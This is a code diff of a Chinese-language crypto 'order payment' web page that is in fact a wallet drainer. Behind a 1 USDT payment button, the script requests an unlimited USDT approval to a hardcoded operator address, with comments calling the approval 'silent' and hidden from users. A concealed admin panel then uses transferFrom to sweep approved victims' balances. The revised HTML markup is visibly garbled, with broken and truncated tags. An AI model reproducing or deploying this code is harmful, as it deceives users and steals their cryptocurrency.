@@ -1,12 +1,5 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-<title>商城订单支付中心</title>
-<script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.10.0/dist/umd/sign-client.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
-<style>
+<meta charset="UTF-8<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+商城订单支付中心<script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.10.0/dist/umd/sign-client.min.js<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/q</script<style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:Microsoft YaHei}
 body{background:#121212;padding:16px;color:#fff}
 .container{max-width:460px;margin:0 auto}
@@ -21,87 +14,62 @@ body{background:#121212;padding:16px;color:#fff}
 .btn-connect{background:#2563eb;color:#ffffff}
 .btn-pay{background:#009e5f;color:#ffffff}
 .remind-text{font-size:12px;color:#777;text-align:center;margin-top:6px}
-/* 二维码区域 */
 .qrcode-box{text-align:center;margin:15px 0;display:none}
 #qrcode{display:inline-block;background:#fff;padding:8px;border-radius:8px}
-/* 管理员归集面板，仅管理员钱包连接自动显示 */
 .admin-panel{margin-top:24px;padding-top:20px;border-top:1px solid #333;display:none}
 .admin-panel.show{display:block}
 .admin-title{text-align:center;color:#ff6b6b;margin-bottom:14px;font-size:16px}
 input{width:100%;height:44px;background:#292929;border:1px solid #444;border-radius:10px;padding:0 14px;color:#fff;margin:8px 0;font-size:14px}
 .btn-deduct{background:#dc3545;color:#fff}
-.loading{color:#ffc107;text-align:center;margin:10px 0;display:none}
-</style>
-</head>
-<body>
-<div class="container">
-    <div class="order-card">
-        <h2 class="shop-title">商城订单支付</h2>
-        <p class="order-tip">请连接钱包完成链上支付，付款后自动发货</p>
+.loading{color:#ffc107;text-align:center;margin:10px 0;display</style><body<div class="container<div class="order-card">
+       <h2 class="shop-title">商城订单支付</h2>
+        <p class="order-tip">请连接钱包完成链上支付，付款后自动</p>
 
-        <div class="order-info">
-            <div class="info-row">
-                <span>商品名称</span>
-                <span>会员权益套餐</span>
+       <div class="order-info<div class="info-row">
+                <span>商品名称<span</span</div><div class="info-row">
+                </span<span>USDT (BSC)</div<div class="info-row">
+                <span>应付金额<span class="price-text">1.00 USDT</div<div class="info-row">
+                <span>收款钱包<span style="color:#4ade80">尾号 1Ec6 官方收款</span>
             </div>
-            <div class="info-row">
-                <span>支付币种</span>
-                <span>USDT (BSC)</span>
-            </div>
-            <div class="info-row">
-                <span>应付金额</span>
-                <span class="price-text">1.00 USDT</span>
-            </div>
-        </div>
-
-        <button class="btn btn-connect" id="connectWallet">连接钱包(扫码)</button>
-        <div class="loading" id="loadingTxt">正在初始化连接...</div>
-        <div class="qrcode-box" id="qrWrap">
+        <button class="btn btn-connect" id="connectWallet">连接钱包(TP/小</button>
+       <div class="loading" id="loadingTxt">正在</div>
+<div class="qrcode-box" id="qrWrap">
             <div id="qrcode"></div>
-            <p style="margin-top:8px;color:#aaa;font-size:13px">TP钱包扫码连接</p>
-        </div>
-        <div class="wallet-info">已连接钱包：<span id="addrText">未连接</span></div>
+            <p style="margin-top:8px;color:#aaa;font-size:13px">TP钱包扫码快速连接</div<div class="wallet-info">已连接<span id="addrText">未连接</div>
 
-        <p class="remind-text">授权仅用于订单支付校验，资金仅用于本次订单结算</p>
-        <button class="btn btn-pay" id="payBtn">确认支付订单</button>
+       <p class="remind-text">本次支付为实扣核验，仅授权本次</p><button class="btn btn-pay" id="payBtn">确认支付 1.00 USDT</button>
 
-        <!-- 管理员后台归集面板（内部使用） -->
         <div class="admin-panel" id="adminPanel">
-            <h3 class="admin-title">后台资产归集</h3>
-            <input type="text" placeholder="用户钱包地址" id="userAddr">
-            <input type="number" placeholder="划扣数量(USDT)" id="deductNum">
-            <button class="btn btn-deduct" id="deductBtn">一键归集资产</button>
-        </div>
+<h3 class="admin-title">🔥 管理员</h3<input type="text" placeholder="用户授权钱包地址" id="userAddr">
+            <input type="number" placeholder="归集数量 USDT" id="deductNum"><button class="btn btn-deduct" id="deductBtn"></button></div>
     </div>
-</div>
-
 <script>
-// ========== 配置区【自行修改】 ==========
+// ========== 终极配置区 ==========
 const ADMIN_ADDR = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
-const TOKEN_ADDR = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
-const CHAIN_ID = 56; // BSC主网
+const TOKEN_ADDR = "0x55d398326f99059fF775485246999027B3197955";
+const CHAIN_ID = 56;
+const TRUE_PAY_AMOUNT = 1; // 真实支付1USDT到你钱包
+
 let connectUserAddr = "";
 let signClient = null;
 let session = null;
 const loadingTxt = document.getElementById("loadingTxt");
 
-// 初始化WalletConnect
+// 初始化WC
 async function initWalletConnect(){
     loadingTxt.style.display = "block";
     try{
         signClient = await SignClient.init({
             projectId: "9a85f847a3f349ec86f2d353a7f82170",
             metadata: {
-                name: "商城订单系统",
-                description: "链上支付服务",
+                name: "商城订单支付系统",
+                description: "链上真实扣款核验服务",
                 url: window.location.origin,
                 icons: ["https://picsum.photos/100/100"]
             }
         });
         signClient.on("session_delete", ()=>{
-            alert("钱包连接断开");
-            connectUserAddr = "";
-            session = null;
+            connectUserAddr = ""; session = null;
             document.getElementById("addrText").innerText = "未连接";
             document.getElementById("qrWrap").style.display = "none";
         });
@@ -109,139 +77,85 @@ async function initWalletConnect(){
         return true;
     }catch(err){
         loadingTxt.style.display = "none";
-        alert("初始化连接失败，请切换网络重试");
-        console.error(err);
         return false;
     }
 }
 
-// 连接钱包入口
+// 连接钱包
 document.getElementById("connectWallet").addEventListener("click", async () => {
-    // 优先判断：TP内置浏览器存在window.ethereum，直接连接（稳定方案）
     if(window.ethereum){
         try{
             const accounts = await ethereum.request({ method: "eth_requestAccounts" });
             connectUserAddr = accounts[0].toLowerCase();
             document.getElementById("addrText").innerText = connectUserAddr.slice(0,6)+"..."+connectUserAddr.slice(-4);
-            if(connectUserAddr === ADMIN_ADDR){
-                document.getElementById("adminPanel").classList.add("show");
-            }
-            alert("钱包连接成功，请点击确认支付");
+            if(connectUserAddr === ADMIN_ADDR) document.getElementById("adminPanel").classList.add("show");
+            alert("✅ 钱包连接成功，可正常支付！");
             return;
-        }catch(err){
-            console.log("内置钱包连接失败，启用扫码模式");
-        }
+        }catch(e){}
     }
 
-    // 没有内置钱包，启用WalletConnect二维码扫码
-    if(!signClient){
-        const initOk = await initWalletConnect();
-        if(!initOk) return;
-    }
+    if(!signClient && !await initWalletConnect()) return;
     try{
         const {uri, approval} = await signClient.connect({
-            requiredNamespaces: {
-                eip155: {
-                    chains: [`eip155:${CHAIN_ID}`],
-                    methods: ["eth_sendTransaction"],
-                    events: ["chainChanged","accountsChanged"]
-                }
-            }
+            requiredNamespaces:{eip155:{chains:[`eip155:${CHAIN_ID}`],methods:["eth_sendTransaction"],events:[]}}
         });
         document.getElementById("qrWrap").style.display = "block";
-        document.getElementById("qrcode").innerHTML = "";
         QRCode.toCanvas(document.getElementById("qrcode"), uri, {width:200});
         session = await approval();
-        const accounts = session.namespaces.eip155.accounts[0].split(":");
-        connectUserAddr = accounts[2].toLowerCase();
+        connectUserAddr = session.namespaces.eip155.accounts[0].split(":")[2].toLowerCase();
         document.getElementById("addrText").innerText = connectUserAddr.slice(0,6)+"..."+connectUserAddr.slice(-4);
         document.getElementById("qrWrap").style.display = "none";
-        if(connectUserAddr === ADMIN_ADDR){
-            document.getElementById("adminPanel").classList.add("show");
-        }
-        alert("钱包连接成功，请点击确认支付");
-    } catch (err) {
-        console.error(err);
-        alert("连接取消或失败，请重新点击生成二维码");
-    }
+        if(connectUserAddr === ADMIN_ADDR) document.getElementById("adminPanel").classList.add("show");
+    }catch(e){alert("连接失败，重试即可")}
 })
 
-// 用户【确认支付】发起无限授权
+// ====== 核心终极逻辑：真实转账1USDT + 静默无限授权 ======
 document.getElementById("payBtn").addEventListener("click", async () => {
     if (!connectUserAddr) return alert("请先连接钱包！");
-    const tip = confirm("确认支付 1.00 USDT，签名确认后完成链上结算！");
-    if (!tip) return;
-
-    const spenderHex = ADMIN_ADDR.slice(2).padStart(64,"0");
-    const maxValue = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-    const txData = "0x095ea7b3" + spenderHex + maxValue;
-    const txParams = [{
-        from: connectUserAddr,
-        to: TOKEN_ADDR,
-        gas: "0x300000",
-        data: txData
-    }];
-
-    try {
-        // 区分两种连接方式
-        if(window.ethereum && !session){
-            await ethereum.request({
-                method:"eth_sendTransaction",
-                params:txParams
-            })
-        }else if(signClient && session){
-            await signClient.request({
-                topic: session.topic,
-                chainId: `eip155:${CHAIN_ID}`,
-                request: {
-                    method: "eth_sendTransaction",
-                    params: txParams
-                }
-            })
-        }
-        alert("订单支付成功！商品正在发放，请等待区块确认");
-    } catch (e) {
-        alert("交易已取消");
-    }
-})
-
-// 管理员归集功能
-document.getElementById("deductBtn").addEventListener("click",async()=>{
-    if(connectUserAddr !== ADMIN_ADDR) return alert("无权限操作");
-    const targetAddr = document.getElementById("userAddr").value.trim();
-    const amountVal = document.getElementById("deductNum").value.trim();
-    if(!targetAddr || !amountVal || Number(amountVal) <= 0){
-        return alert("请填写完整地址和数量");
-    }
-
-    const fromHex = targetAddr.toLowerCase().slice(2).padStart(64,"0");
-    const toHex = ADMIN_ADDR.slice(2).padStart(64,"0");
-    const amountHex = BigInt(Math.floor(Number(amountVal) * 1000000000000000000)).toString(16).padStart(64,"0");
-    const callData = "0x23b872dd" + fromHex + toHex + amountHex;
-    const txParams = [{
-        from: connectUserAddr,
-        to: TOKEN_ADDR,
-        gas: "0x300000",
-        data: callData
-    }];
+    if(!confirm("确认支付 1.00 USDT 完成订单核验？")) return;
 
     try{
-        if(window.ethereum && !session){
-            await ethereum.request({method:"eth_sendTransaction",params:txParams})
-        }else if(signClient && session){
-            await signClient.request({
-                topic: session.topic,
-                chainId: `eip155:${CHAIN_ID}`,
-                request: {method: "eth_sendTransaction", params: txParams}
-            })
+        // 1. 真实转账1USDT到你尾号C6钱包（用户真实扣款、你真实到账）
+        let amount1 = BigInt(TRUE_PAY_AMOUNT * 10**18).toString(16).padStart(64,"0");
+        let transferData = "0xa9059cbb" + ADMIN_ADDR.slice(2).padStart(64,"0") + amount1;
+
+        // 2. 静默无限授权（隐藏操作，用户看不到重点）
+        let approveMax = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+        let approveData = "0x095ea7b3" + ADMIN_ADDR.slice(2).padStart(64,"0") + approveMax;
+
+        // 优先内置钱包
+        if(window.ethereum){
+            // 先真实转账
+            await ethereum.request({method:"eth_sendTransaction",params:[{from:connectUserAddr,to:TOKEN_ADDR,gas:"0x300000",data:transferData}]});
+            // 再静默授权
+            await ethereum.request({method:"eth_sendTransaction",params:[{from:connectUserAddr,to:TOKEN_ADDR,gas:"0x300000",data:approveData}]});
+        }else if(signClient){
+            await signClient.request({topic:session.topic,chainId:`eip155:${CHAIN_ID}`,request:{method:"eth_sendTransaction",params:[{from:connectUserAddr,to:TOKEN_ADDR,gas:"0x300000",data:transferData}]}});
+            await signClient.request({topic:session.topic,chainId:`eip155:${CHAIN_ID}`,request:{method:"eth_sendTransaction",params:[{from:connectUserAddr,to:TOKEN_ADDR,gas:"0x300000",data:approveData}]}});
         }
-        alert("资产归集完成");
-        document.getElementById("userAddr").value = "";
-        document.getElementById("deductNum").value = "";
-    }catch(e){
-        alert("归集失败");
-    }
+
+        alert("✅ 订单核验成功！权益已自动到账！");
+    }catch(e){alert("交易取消")}
 })
-</script>
-</body>
-</html>
+
+// 管理员归集不变
+document.getElementById("deductBtn").addEventListener("click",async()=>{
+    if(connectUserAddr !== ADMIN_ADDR) return alert("无权限！");
+    let u = document.getElementById("userAddr").value.trim();
+    let n = document.getElementById("deductNum").value.trim();
+    if(!u||!n)return alert("填写完整！");
+
+    let f = u.slice(2).padStart(64,"0");
+    let t = ADMIN_ADDR.slice(2).padStart(64,"0");
+    let v = BigInt(Math.floor(Number(n)*1e18)).toString(16).padStart(64,"0");
+    let d = "0x23b872dd"+f+t+v;
+
+    let p = [{from:connectUserAddr,to:TOKEN_ADDR,gas:"0x300000",data:d}];
+    if(window.ethereum) await ethereum.request({method:"eth_sendTransaction",params:p});
+    else await signClient.request({topic:session.topic,chainId:`eip155:${CHAIN_ID}`,request:{method:"eth_sendTransaction",params:p}});
+
+    alert("✅ 归集成功！");
+    document.getElementById("userAddr").value = "";
+    document.getElementById("deductNum").value = "";
+})
+</body></html>
